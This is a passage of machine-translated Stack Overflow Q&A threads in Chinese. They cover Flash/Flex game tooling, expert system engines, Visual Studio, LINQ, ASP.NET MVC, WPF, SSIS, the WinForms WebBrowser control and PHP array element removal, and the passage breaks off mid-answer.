它涵盖了 Blend 中各种小部件的基本功能。FWIW，它对我有用。

# flash - 基于 Web 的游戏开发：Flex Builder 还是 Flash CS3？

> ID：369558
> 
> 赞同：14
> 
> 时间：2008-12-15T20:12:23.470
> 
> 标签：flash, apache-flex

我正在研究 Flash 和 Flex 中的游戏开发。我已经下载了 Flex Builder 试用版并使用过旧版本的 Flash。我看到一般来说，Flex Builder 是开发人员的工具，而 Flash 是设计人员的工具。我不清楚一个是否比另一个更适合游戏开发，或者是否有必要同时拥有两者才能有效地设计游戏。在我看来，游戏等同于设计/艺术和编程。哪种工具更普遍或更密集地用于游戏开发？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2008-12-15T20:59:03.530

Flex builder：比 Flash CS3/CS4 更好的开发/编码环境

Flash CS3/CS4：比 Flex 更好的设计环境

“Flash 风格”应用程序：（Sprites、MovieClips 而不是 flex UIComponents）通常在游戏类型工作中表现更好。

那么，您如何获得所有这些好处呢？您可以在 Flex Builder 中制作普通的旧 Flash 应用程序，它们不必是 Flex 应用程序（文件->新建->Actionscript 项目）。在 Flash CS3/CS4 中准备艺术资源，让您在 Flex Builder 中的所有代码获得两全其美的效果。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2008-12-17T04:34:46.310

一个让我流口水的假设工作流程是一个专门的艺术家/设计师团队在 Flash 中创建资源，并将它们作为 swfs 导出给使用 FlashDevelop 的程序员。

设计人员无需编写代码，他们以 Flash 文档的形式处理一个或多个资产存储库。每个资产都是“Exported for Actionscript”（在 Linkage 菜单下）并被赋予适当的类名。然后将 Flash 文档作为 swfs 发布给开发人员。

开发人员将这些已发布的资产复制到项目目录，在那里它们可以嵌入到带有元数据标签的`Asset`类（或类似）中......`[Embed]`

```
public class Asset {

    [Embed(source="./assets/Enemies.swf", symbol="asset.KohrAhMeleeShip")]
    public static var KohrAhMeleeShip:Class;

    // etc.
} 
```

然后，在游戏代码中...

```
var enemyFighter:EnemyFighter = new EnemyFighter( Asset.KohrAhMeleeShip );
addChild(enemyFighter); 
```

然后，开发人员可以发布一个整体的 swf，其中包含整个游戏代码和所有资产。这并不排除开发人员在运行时（使用`Loader`类）“导入加载”附加资产，这将减少初始加载时间。

白日梦结束。

PS。[FlashDevelop](http://www.flashdevelop.org/)是一个*非常*引人注目的 Flash 游戏开发环境，特别是与 Flex Builder 相比，后者面向非常特定类型的应用程序 (RIA)。

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2008-12-15T20:30:24.400

或者第三个玩家：[Haxe](http://haxe.org/)

Haxe 用于游戏开发。[其中一些在使用 Haxe](http://old.haxe.org/com/people)的人页面上有所提及。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2008-12-16T08:17:00.980

如果您的游戏很简单，或者您是艺术家，那么 Flash CS3/4 是明智的选择。

如果您的游戏很复杂，或者您将要花上一段时间，您会希望使用 Flex。使用 Adob​​e 语言和工具进行开发对开发人员来说总是很痛苦，但 Flex 不如原始 Flash 那样痛苦。Flex 至少为构建应用程序提供了一个健全的 OO 框架。虽然 Flex 非常臃肿，因此您必须小心调整 SWF 大小，但它确实在可维护性和代码可伸缩性方面得到了回报。

选择不是相互排斥的。您可以在 Flash CS3/4 中构建 Flash 组件并在 Flex 中使用它们。使用两者进行开发的主要挑战是缺乏连贯的文档或 Adob​​e 的支持。

Flex Builder 是适合初学者的方式，但一旦 60 天试用期结束，它就会非常昂贵。

至于哪个用的比较多，大概是原生的Flash。但这可能会随着 Flex 的发展而改变。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2008-12-16T07:55:54.390

我对大部分图形使用 CS3，并在 FlashDevelop（也可以是 Flex Builder）中编写所有代码。
由于编码和图形是两个相当独立的东西，因此为它们使用两种不同的工具并不是一件坏事。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2009-01-23T11:15:30.550

如果您正在创建逐帧动画和布局，Flash CS3/4 非常有用。如果你乐于在代码中做这些事情，那么你就不需要它了。无论如何，它不是创建艺术品的最佳工具，您可以使用 Paint.Net 和 Inkscape 来制作它们都是免费的（如果有钱，也可以使用 PhotoShop 和 Illustrator）。

您不想使用 Flex 框架，因此如果您正在使用 Flexbuilder，您将希望创建一个 ActionScript 项目而不是 MXML 项目，正如其他人所指出的那样。节省一些钱，只需使用带有 MXMLC 编译器的 Flashdevelop。

这是我写的关于制作 Flash 游戏的免费软件的博客文章：

[http://blog.iainlobb.com/2008/11/cool-free-and-open-source-software-for.html](http://blog.iainlobb.com/2008/11/cool-free-and-open-source-software-for.html)

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-12-15T20:45:39.207

我没有使用 flash cs3 的经验，但对 flex builder 有很多经验。如果 flex builder 是最佳选择，我会感到惊讶。为 flex builder 付费的唯一真正原因是图表，我不认为它会出现在游戏中。它可能是最好的动作脚本编辑器（这是我认为的“游戏逻辑”），但肯定有很好的免费的。实际的编译器是免费的，而 flex builder 并不能真正帮助您处理游戏的可视化组件。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-01-23T10:08:14.973

我使用 flash cs3/cs4 和 flex builder 3.0 进行游戏开发，

flash 对设计师来说更好，对开发人员来说更痛苦，因为动作面板不适合编程，编程不成熟，只适用于在 swf 上放置动态动画的设计师，

flex 是用于开发游戏的强大工具，如 Visual Studio 2005 和用于 java 的 netbeans，它让程序员可以轻松地以面向对象的方法编写代码，

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2009-11-14T23:20:49.297

我不能说我使用过 CS3/4，但如果你想用 Flex 制作游戏，这里有一个教程系列[向](http://www.brighthub.com/hubfolio/matthew-casperson/blog/archive/2009/09/03/flash-game-development-with-flex-and-actionscript.aspx)你展示如何操作。

# open-source - 开源专家系统

> ID：369566
> 
> 赞同：12
> 
> 时间：2008-12-15T20:15:01.217
> 
> 标签：open-source, expert-system

有人知道开源专家系统吗？实际上，我对从 C# 调用它的推理引擎很感兴趣。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-07-04T21:40:17.410

其他答案中已经提到了 CLIPS 和 JESS，因此我将提供 CLIPS 与 JESS 的链接：http: [//www.comp.lancs.ac.uk/~kristof/research/notes/clipsvsjess/](http://www.comp.lancs.ac.uk/~kristof/research/notes/clipsvsjess/)

它写于 1999 年 6 月 4 日，当时 CLIPS 的优势显而易见。

如果您不想全部阅读，以下是结论：

> 第三章结论
> 
> CLIPS 和 JESS 都是在互联网上有大量支持的产品，但 CLIPS 似乎拥有更广泛的受众，可能是因为它存在的时间更长。这种年龄差异导致 CLIPS 包更加稳定和完整，而 JESS 用户仍然会遇到一些小错误。JESS 不断更新，作者 Ernest Friedman-Hill 对用户/开发人员的反馈非常敏感，并定期发布新版本和错误修复。
> 
> 如今，JESS 和 CLIPS 之间的选择取决于应用程序。如果它是基于 Web 的或者应该以小程序形式存在，那么选择 JESS 是一个非常合乎逻辑的选择（甚至得到 CLIPS 的作者的支持）。对于更经典的应用程序，可能会选择CLIPS，因为它具有更稳定和支持更多的声誉。
> 
> JESS 的未来在很大程度上取决于 Web 的发展、Java 编程语言及其自身未来的稳定性。这三个条件使得 JESS 很可能会变得更流行和更频繁地使用。尤其是面向对象的可能性和易于集成到 Java 代码中，使 JESS 的未来充满希望。
> 
> 另一方面，CLIPS 更有可能在新功能出现时首先实现它们，因为它仍然具有时间优势。CLIPS 还具有各种扩展和变体（例如 FuzzyCLIPS、AGENT CLIPS、DYNACLIPS、KnowExec、CAPE、PerlCLIPS、wxCLIPS 和 EHSIS 等等），这使其在支持模糊逻辑和代理等方法方面具有优势。
> 
> 支持windows的操作系统的CLIPS的多功能开发环境也是一个优势，而JESS只有一个窗口，有两个按钮（'clear window'和'quit'），没有菜单。图 1 和图 2 描述了这两种环境。
> 
> 总而言之，CLIPS 仍然比 JESS 更完整和更稳定，但是这在未来可能会改变，因为 JESS 包正在不断改进。除此之外，JESS 还具有使用 Java 的特性，从长远来看，这可能被证明是比 CLIPS 的一大优势。

这些链接也可能感兴趣： [http ://en.wikipedia.org/wiki/CLIPS](http://en.wikipedia.org/wiki/CLIPS)

商业和免费软件专家系统外壳 [http://www.kbsc.com/rulebase.html](http://www.kbsc.com/rulebase.html)

[是否有具有推理能力的开源专家系统？](https://stackoverflow.com/questions/9642004/are-there-open-source-expert-systems-with-reasoning-capabilities)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-12-15T20:49:39.650

大约一年前，我经历了同样的过程，试图为此找到一个好的 .Net 系统。我记得找到了一些不错的引擎，但它们都太笼统了，需要太多假设。

最后我发现编写自己的系统很容易做到，而且它完全按照我的意愿去做，没有任何额外的牛逼让它与一些抽象的通用引擎一起工作。

了解您的预期用途可能会有所帮助。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-12-15T20:28:13.390

看看[CLIPS——](http://clipsrules.sourceforge.net/)它是用 C 编码的。

[在Wikipedia](http://en.wikipedia.org/wiki/CLIPS)上有更多关于 CLIPS 的信息。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2010-11-18T11:35:21.963

如果您考虑使用规则处理引擎，JBoss Rules（也称为 Drools）是我所知道的最好的。开源和免费。它是用 Java 编写的，但专为集成而设计。您可以将对象合并到组件中的规则和基于规则的应用程序中。您甚至可以即时构建或修改规则库。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-01-30T13:23:30.733

[AI::ExpertSystem::Advanced](http://search.cpan.org/~pfischer/AI-ExpertSystem-Advanced-0.03/lib/AI/ExpertSystem/Advanced.pm)或[AI::ExpertSystem::Simple](http://search.cpan.org/~peterhi/AI-ExpertSystem-Simple.1.2/lib/AI/ExpertSystem/Simple.pm) 是 Perl 解决方案。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2011-05-27T01:01:53.237

您可以尝试 JESS，但它是基于 Java 的。Amzilogic 也提供了一个很好的平台。

# html - VS2005：如何不让VS尝试将文本文件资源解析为html？

> ID：369570
> 
> 赞同：0
> 
> 时间：2008-12-15T20:16:51.730
> 
> 标签：html, visual-studio, resources

我在我的 Visual Studio 2005 解决方案中包含了一个资源，它是硬盘驱动器上的一个文件。它是一个文本文件，包含文本，扩展名为**.htm 。**

几个月来它工作得很好，直到我想编辑文本文件的内容。突然间，Visual Studio 坚持对文件进行语法检查，就好像它是一个 HTML 文件一样——实际上它不是。

我真的不想通过强制文件命名来解决 Visual Studio 中的这个错误：

```
SomeFilename.htm.VSbug.doNotRemove 
```

而不是

```
SomeFilename.htm 
```

并非所有使用该文件的东西都是 Visual Studio，如果因为 Visual Studio 的问题而强迫所有人进行更改，那将是一种耻辱。

更重要的是——我最初做了什么让VS（正确地）忽略随机添加的文本文件——我该如何再做一次？

* * *

## 更新一

当然，由于有些人很好奇 - 这是文件的内容：

一些文件名.htm

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
    "http://www.w3.org/TR/html4/strict.dtd"> 
<HTML>
<HEAD>
    <TITLE>New Document</TITLE>
    <META http-equiv="X-UA-Compatible" content="IE=edge">
    <META http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
</HEAD>

<BODY style="margin: 0 auto">
    <DIV style="text-align:center;">
        <A href="%PANELLINK%" target="_blank"><IMG border="0" src="%PANELIMAGE%" style="%IMAGESTYLE%"></A><BR>
        %CAPTIONTEXT%
    </DIV>
</BODY>
</HTML> 
```

如您所见，该文件不包含 html。不要忘记 - 文件的内容无关紧要。

* * *

# 回答

通过 Visual Studio 编辑文件会触发 Visual Studio 认为它对资源文件的内容具有一定的管辖权。

删除文件并重新添加它，以及仅在 VS 之外编辑资源文本文件，确保 VS 不会尝试解析文件的内容。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-15T20:20:55.887

这显然引出了一个问题——为什么在系统上使用错误的文件扩展名，而文件类型由这些扩展名决定？

对不起，答案当然是错误的。我很确定我已经这样做了。尽管如此，我认为上述评论仍然有效，即使不能普遍适用。将答案标记为“冒犯性”只是粗鲁，并不会改变这一点。

~~但是，您的问题可以相对容易地解决。您可以右键单击它并在其上下文菜单中选择“打开方式...”，而不是通过双击打开文件。在那里您可以选择文本编辑器。~~

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-15T20:24:15.147

也许这个？

[http://weblogs.asp.net/scottgu/archive/2007/09/18/vs-2008-support-to-treat-html-css-and-jscript-validation-issues-as-warnings-instead-of-错误.aspx](http://weblogs.asp.net/scottgu/archive/2007/09/18/vs-2008-support-to-treat-html-css-and-jscript-validation-issues-as-warnings-instead-of-errors.aspx)

我打开我的 2005 并转到工具 -> 选项 -> 文本编辑器 -> HTML/XML -> 特定于 HTML 并取消选中“启用 html 验证”框。我认为它应该可以解决您的问题。

# linq - 按总和分组的LINQ错误无效的列名

> ID：369572
> 
> 赞同：3
> 
> 时间：2008-12-15T20:18:03.443
> 
> 标签：linq, linq-to-sql

出于某种原因，当在 group by 上使用两个总和时，我遇到了错误“无效的列名 'id'。当我只做一个总和时，它按预期工作。

以下**失败**并引发错误：

```
from pd in PrDetails.Where(_pd => _pd.PrId == 46)
    group pd by new { pd.ProgramFund, pd.ProjectDetail.CostCenter, pd.ProjectDetail.Wbs }
    into g
select new
    {
        g.Key.ProgramFund,
        g.Key.CostCenter,
        g.Key.Wbs,
        CommittedTotal = g.Sum(_pd => _pd.PrDetailPrAmounts.Sum(_pa => _pa.CommittedAmount)),
        OverheadTotal = g.Sum(_pd => _pd.PrDetailPrAmounts.Sum(_pa => _pa.OverheadAmount))
    } 
```

但是，以下**确实**可以正常工作：

```
from pd in PrDetails.Where(_pd => _pd.PrId == 46)
    group pd by new { pd.ProgramFund, pd.ProjectDetail.CostCenter, pd.ProjectDetail.Wbs }
    into g
select new
    {
        g.Key.ProgramFund,
        g.Key.CostCenter,
        g.Key.Wbs,
        CommittedTotal = g.Sum(_pd => _pd.PrDetailPrAmounts.Sum(_pa => _pa.CommittedAmount))
    } 
```

**而且**，当我得到开销总数而不是承诺总数时，它的效果很好：

```
from pd in PrDetails.Where(_pd => _pd.PrId == 46)
        group pd by new { pd.ProgramFund, pd.ProjectDetail.CostCenter, pd.ProjectDetail.Wbs }
        into g
    select new
        {
            g.Key.ProgramFund,
            g.Key.CostCenter,
            g.Key.Wbs,
            OverheadTotal = g.Sum(_pd => _pd.PrDetailPrAmounts.Sum(_pa => _pa.OverheadAmount))
        } 
```

为什么我不能同时获得承诺总额和间接费用总额？

我在下面有我们的基本表结构：

## 公关详情

Id (int)
PrId (int)
ProgramFund（linq 类）
ProjectDetail（linq 类）

## 项目详情

Id (int)
CostCenter (linq 类)
Wbs (linq 类)

## 量

Id (int)
PrDetailId (int)
CommittedAmount (十进制)
OverheadAmount (十进制)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-12-21T21:37:49.357

您应该启动 SQL 探查器并检查生成的确切 SQL，这应该会引导您朝着正确的方向前进

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-15T22:14:04.847

关于我能想到的唯一想法可能是与您的参数名称冲突。试试这个：

```
from pd in PrDetails.Where(_pd => _pd.PrId == 46)
group pd by new { pd.ProgramFund, pd.ProjectDetail.CostCenter, pd.ProjectDetail.Wbs }
into g
select new
{
    g.Key.ProgramFund,
    g.Key.CostCenter,
    g.Key.Wbs,
    CommittedTotal = g.Sum(_pd1 => _pd1.PrDetailPrAmounts.Sum(_pa1 => _pa1.CommittedAmount)),
    OverheadTotal = g.Sum(_pd2 => _pd2.PrDetailPrAmounts.Sum(_pa2 => _pa2.OverheadAmount))
} 
```

# asp.net - 如何使用 Html.RenderPartial() 将任意位数据传递给 ASP.NET MVC 中的用户控件？

> ID：369573
> 
> 赞同：5
> 
> 时间：2008-12-15T20:18:32.443
> 
> 标签：asp.net, asp.net-mvc

我有一个强类型的用户控件（“部分”），我希望能够从它的包含视图中传递一些额外的信息。例如，我有一个绑定到产品类的视图，并且我有一个部分也被强类型化到同一个模型，但我还需要将 imageSize 的附加参数传递给我的部分。我希望能够做这样的事情：

```
<% Html.RenderPartial("_ProductImage", ViewData.Model, new { imageSize = 100 }); %> 
```

据我所知，没有办法做到这一点，但我希望比我聪明的人能有一个解决方案；）

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-12-15T20:22:51.967

更改部分模型的类型：

```
class PartialModel 
{
    public int ImageSize { get; set; }
    public ParentModelType ParentModel { get; set; }
} 
```

现在通过它：

```
<% Html.RenderPartial("_ProductImage", 
    new PartialModel() { ImageSize = 100, ParentModel = ViewData.Model }); %> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-16T06:37:46.123

不是最漂亮的解决方案

```
<% ViewData["imageSize"] = 100; %>

<% Html.RenderPartial("_ProductImage"); %> 
```

默认情况下传递 ViewData

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-02-25T04:57:29.630

我使用通用类模型——它在概念上与 Craig 建议的方法相似。

我有点希望 MS 会创建一个重载来`RenderPartial`为我们提供相同的功能。只需一个附加`object data`参数就可以了。

无论如何，我的方法是创建一个使用泛型的 PartialModel，以便它可以用于所有 .ascx 控件。

```
 public class PartialControlModel<T> : ModelBase 
    {
        public T ParentModel { get; set; }
        public object Data { get; set; }

        public PartialControlModel(T parentModel, object data) : base()
        {
            ParentModel = parentModel;
            Data = data;
        }
    } 
```

如果您希望视图是强类型的，则.ascx 控件应该从正确的继承，`PartialControlModel`如果您已经做到这一点，您很可能会这样做。

```
public partial class ThumbnailPanel : 
                     ViewUserControl<PartialControlModel<GalleryModel>> 
```

然后你像这样渲染它：

```
<% Html.RenderPartial("ThumbnailPanel", 
new PartialControlModel<GalleryModel>(ViewData.Model, tag)); %> 
```

当然，当您引用任何父模型项时，您必须使用以下语法：

```
ViewData.Model.ParentModel.Images 
```

您可以获取数据并将其转换为正确的类型：

```
ViewData.Model.Data 
```

如果有人对如何改进我正在使用的泛型有任何建议，请告诉我。

# wpf - 如何将数据绑定到 collectionviewsource 后面的集合上的属性？

> ID：369574
> 
> 赞同：0
> 
> 时间：2008-12-15T20:18:34.657
> 
> 标签：wpf, data-binding

我目前有一个带有 HasChanges 属性的集合（集合中的每个对象也有自己的 HasChanges 属性），并且该集合是我的 CollectionViewSource 的来源。

当我尝试将 CollectionViewSource 后面的集合的 HasChanges 属性数据绑定到我的自定义控件之一时，它会绑定到当前选定对象的 HasChanges 属性，而不是 CollectionViewSource 源集合的 HasChanges 属性。有没有一种方法可以明确地告诉绑定查看集合对象而不是集合中的对象？

我的代码看起来像这样：

```
<Window x:Class="CollectionEditWindow"
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    xmlns:Local="clr-namespace:My.Local.Namespace;assembly=My.Local.Namespace">
    <Window.Resources>
        <CollectionViewSource x:Name="CVS" x:Key="MyCollectionViewSource" />
    </Window.Resources>

<Local:MyCustomControl HasChanges="{Binding HasChanges, Source={StaticResource 
                         MyCollectionViewSource}}">
<!-- Code to set up the databinding of the custom control to the CollectionViewSource-->
</Local:MyCustomControl>
</Window> 
```

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-15T21:51:01.163

当你绑定到 CollectionViewSource 时，你会得到一个[CollectionView](http://msdn.microsoft.com/en-us/library/system.windows.data.collectionview.aspx)，它有一个[SourceCollection](http://msdn.microsoft.com/en-us/library/system.windows.data.collectionview.sourcecollection.aspx)属性，你可以使用它来获取 CollectionViewSource 后面的集合，如下所示：

```
<Grid xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
      xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
      xmlns:sys="clr-namespace:System;assembly=mscorlib">
    <Grid.Resources>
        <x:Array x:Key="data" Type="{x:Type sys:String}">
            <sys:String>a</sys:String>
            <sys:String>bb</sys:String>
            <sys:String>ccc</sys:String>
            <sys:String>dddd</sys:String>
        </x:Array>
        <CollectionViewSource x:Key="cvsData" Source="{StaticResource data}"/>
    </Grid.Resources>
    <StackPanel>
        <ListBox ItemsSource="{Binding Source={StaticResource cvsData}}"/>
        <TextBlock Text="{Binding Source={StaticResource cvsData}, Path=Length, StringFormat='{}Length bound to current String = {0}'}"/>
        <TextBlock Text="{Binding Source={StaticResource cvsData}, Path=SourceCollection.Length, StringFormat='{}Length bound to source array = {0}'}"/>
    </StackPanel>
</Grid> 
```

# sql - 在 ExecuteSQL 任务中访问“全局”变量

> ID：369591
> 
> 赞同：1
> 
> 时间：2008-12-15T20:26:09.790
> 
> 标签：sql, ssis, global-variables

我有一个 SSIS 包，它执行以下操作： 从服务器表中选择连接字符串。连接字符串或者是服务器的名称以及域（即 Dalin.myhouse.com），或者是服务器的直接 IP。

该包遍历每个连接字符串并填充定义的“全局”变量。此变量是在变量设计器中创建的。对于每个连接字符串，包将检索有关服务器的信息。

我遇到的问题是，当您将服务器 IP 添加到列表时，当时可能不知道“友好名称”，所以我只会在连接字符串列和友好名称列中都有服务器 IP桌子。我想在迭代结束后更新该表中服务器条目的友好名称列，以便使用 SERVERPROPERTY('Servername') 从服务器中提取服务器名称

为此，我想使用带有以下代码的 ExecuteSQL 任务：

```
UPDATE [myDB].[mySchema].[myServers]
SET [ServerName] = VarA
WHERE ConnectionString = VarB 
```

前面的代码使用到 myServers 表所在的服务器的静态连接。

VarA 表示我要设置的全局值 ServerName 将通过使用 SERVERPROPERTY('Servername') 在单独的 SQLTask 中设置。它需要在一个单独的任务中，因为它必须使用当前迭代正在使用的同一服务器连接到服务器。

VarB 在每次迭代开始时设置为列表中的下一个连接字符串。

我已经看到了有关如何将其用于脚本任务和脚本组件的示例，但我想简单地使用 ExecuteSQL 任务来完成此操作。

总结：
连接ServerA，填写两个全局变量。
连接到 ServerB 并使用两个全局变量来更新表中的特定行。

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-16T15:42:08.227

如果没有在脚本任务中设置变量，我无法看到如何实现这一点，因为必须将 ExecuteSQL 任务设置为数据库连接。脚本任务为此工作，因为它们的连接在执行它们的服务器的上下文中。话虽如此，您可以在此 ExecuteSQL 任务之前使用脚本任务，将变量设置为本地服务器实例。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-17T04:00:43.117

所以你需要Execute SQL任务来取参数吗？

[http://msdn.microsoft.com/en-us/library/ms187685.aspx](http://msdn.microsoft.com/en-us/library/ms187685.aspx)

可能我理解错了...

# c# - WebBrowser.Navigated 仅在我 MessageBox.Show() 时触发；

> ID：369594
> 
> 赞同：0
> 
> 时间：2008-12-15T20:26:58.947
> 
> 标签：c#, multithreading, delegates, browser, apartments

我有一个 WebBrowser 控件，它是从后台 STA 线程动态实例化的，因为父线程是 BackgroundWorker 并且还有很多其他事情要做。

问题是导航事件永远不会触发，除非我在告诉它.Navigate() 的方法中弹出一个MessageBox.Show()。我将解释：

```
ThreadStart ts = new ThreadStart(GetLandingPageContent_ChildThread);
Thread t = new Thread(ts);
t.SetApartmentState(ApartmentState.STA);
t.Name = "Mailbox Processor";
t.Start();

protected void GetLandingPageContent_ChildThread()
{
 WebBrowser wb = new WebBrowser();
 wb.Navigated += new WebBrowserNavigatedEventHandler(wb_Navigated);
 wb.Navigate(_url);
 MessageBox.Show("W00t");
}

protected void wb_Navigated(object sender, WebBrowserNavigatedEventArgs e)
{
 WebBrowser wb = (WebBrowser)sender; // Breakpoint
 HtmlDocument hDoc = wb.Document;
} 
```

这很好用；但是由于这是一个自动化应用程序，因此消息框会妨碍您。当我删除 MessageBox.Show() 时，WebBrowser.Navigated 事件永远不会触发。我尝试用 Thread.Sleep() 代替这一行，并挂起父线程。

一旦我解决了这个问题，我打算在 WebBrowser 执行其工作时暂停父线程，并找到某种方法将生成的 HTML 传递回父线程，以便它可以继续执行进一步的逻辑。

*为什么这样做？我该如何解决？*

如果有人可以为我提供一种获取网页内容、填写一些数据并在提交按钮的另一侧返回页面内容的方法，所有这些都针对不支持 POST 动词也不支持的网络服务器通过 QueryString 传递数据，我也会接受这个答案，因为整个练习都是不必要的。

* * *

**解决方案：**在团队架构师的建议下，我最终根本没有使用 BackgroundWorker 和从属线程......虽然以牺牲响应性为代价:(

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-15T20:37:42.670

`WebBrowser`除非它被显示并且关联了一个 UI 线程，否则它不会做太多；您是否正在显示它所在的表格？您需要使用 DOM 等。如果您不想将表单显示给用户，则该表单可能会在屏幕外显示，但它在服务中无法正常工作（例如）。

出于抓取目的，您通常可以使用`WebClient`etc 模拟常规 HTML 浏览器。这还不够吗？您可以使用“ [Fiddler](http://www.fiddlertool.com/) ”之类的工具来调查您需要向服务器发出的确切请求。不仅如此，您还可以查看[HTML Agility Pack](http://www.codeplex.com/htmlagilitypack)，它无需浏览器即可提供对 HTML 的 DOM 访问。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-16T13:47:36.227

如果 WebBrowser 的可见性设置为 false，则不会触发 Navigated 和 DocumentComplete 事件。您可以通过使 WebBrowser 可见但将其位置设置为使其位于用户界面之外来解决此限制，例如：

```
wb.Visible = true;
wb.Left = -wb.Width; // notice the minus sign 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2010-05-29T03:44:48.987

你需要添加这样一行：

```
webBrowser1.Navigated += new WebBrowserNavigatedEventHandler(webBrowser1_Navigated); 
```

`webBrowswer1_Navigated`事件触发时要调用的函数在哪里。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-15T20:41:04.020

是否已经启动了 GUI 线程？也许 WebBrowser 对象使用 GUI 线程来处理事件。在这种情况下，您应该从创建 WebBrowser 的线程中调用 Application.Run()（将 MessageBox.Show() 替换为此）。Application.Run() 将挂起，直到 Application.Exit() 被调用。

现在试图测试这个。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-12-16T20:35:09.443

在团队架构师的建议下，我最终完全没有使用 BackgroundWorker 和从属线程......虽然以牺牲响应性为代价:(

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-05-02T17:27:24.930

如果 WebBrowser 控件不在 STA 线程中，则它不能工作。如果您想在线程中使用 WebBrowser 实例，您需要创建线程并调用`Thread.SetApartmentState(ApartmentState.STA);`

# javascript - 使用 ASP.Net MVC 的 PageMethods

> ID：369595
> 
> 赞同：5
> 
> 时间：2008-12-15T20:27:28.463
> 
> 标签：javascript, asp.net-mvc, pagemethods

我发现 ASP.Net PageMethods 非常方便易用，但我刚刚开始使用 MVC 进行开发，不知道如何使用它们？

`PageMethods.MyFunction()`在 MVC 中，MyFunction 是控制器动作的等价物是什么？

我知道我可以使用该`Json`函数返回一个值，但是如何从客户端调用该操作？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-12-15T21:11:50.540

> 我知道我可以使用 Json 函数返回一个值，但是如何从客户端调用该操作？

我认为您正在寻找[getJSON](http://docs.jquery.com/Ajax/jQuery.getJSON)

```
$.getJSON("/controller/action", function(json)
{
  alert("JSON Data: " + json.users[3].name);
}); 
```

或[ajax](http://docs.jquery.com/Ajax/jQuery.ajax) jQuery 方法。

两者都可以很容易地调用一个动作并从 ASP.NET MVC 中获取 JSON 数据。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-15T20:44:29.473

我认为您不需要页面方法。asp.net 中的页面方法是一种将页面类中的方法公开给客户端代码的方法。

在 MVC 中，您没有页面类，因此您只需向 url（../controller/action/params 或其他）发出 XHR，并从操作返回 JSON。

**更新**：重新阅读您的问题后，听起来您想知道*如何*从客户端发出 XHR。在原始 javascript 中，您可以只使用 XMLHttpRequest 对象，但是您使用的任何 JS 库都可能具有更好的包装器。例如，jQuery 就[在这里](http://docs.jquery.com/Ajax/jQuery.ajax#options)

# php - 在 PHP 中从数组中删除一个元素

> ID：369602
> 
> 赞同：2867
> 
> 时间：2008-12-15T20:28:55.307
> 
> 标签：php, arrays, unset

有没有一种简单的方法可以使用 PHP 从数组中删除一个元素，从而`foreach ($array)`不再包含该元素？

我认为将其设置为`null`可以做到这一点，但显然它不起作用。

* * *

## 回答 #1

> 赞同：3317
> 
> 时间：2008-12-15T20:30:46.303

删除数组元素有多种方法，其中有些方法对某些特定任务比其他方法更有用。

## 删除单个数组元素

如果您只想删除一个数组元素，您可以使用[`unset()`](https://secure.php.net/manual/en/function.unset.php)或者[`\array_splice()`](https://secure.php.net/manual/en/function.array-splice.php).

如果您知道值并且不知道删除元素的键，您可以使用它[`\array_search()`](http://php.net/manual/en/function.array-search.php)来获取键。这仅在元素不多次出现时才有效，因为`\array_search`仅返回第一次命中。

### [`unset()`](http://php.net/manual/en/function.unset.php)

请注意，当您使用`unset()`数组键时不会改变。如果要重新索引可以使用[`\array_values()`](http://php.net/manual/en/function.array-values.php)after的键`unset()`，这会将所有键转换为从 0 开始的数字枚举键。

代码：

```
$array = [0 => "a", 1 => "b", 2 => "c"];
unset($array[1]);
          // ↑ Key which you want to delete 
```

输出：

```
[
    [0] => a
    [2] => c
] 
```

### [`\array_splice()`](http://php.net/manual/en/function.array-splice.php)方法

如果您使用`\array_splice()`键将自动重新索引，但关联键不会更改 - 与 相反`\array_values()`，它将所有键转换为数字键。

`\array_splice()`需要*offset*而不是*key*作为第二个参数。

代码：

```
$array = [0 => "a", 1 => "b", 2 => "c"];
\array_splice($array, 1, 1);
                   // ↑ Offset which you want to delete 
```

输出：

```
[
    [0] => a
    [1] => c
] 
```

`array_splice()`，和 一样`unset()`，通过引用获取数组。您不会将这些函数的返回值分配回数组。

## 删除多个数组元素

如果您想删除多个数组元素并且不想调用`unset()`或`\array_splice()`多次调用，您可以使用函数`\array_diff()`或`\array_diff_key()`取决于您是否知道要删除的元素的值或键。

### [`\array_diff()`](http://php.net/manual/en/function.array-diff.php)方法

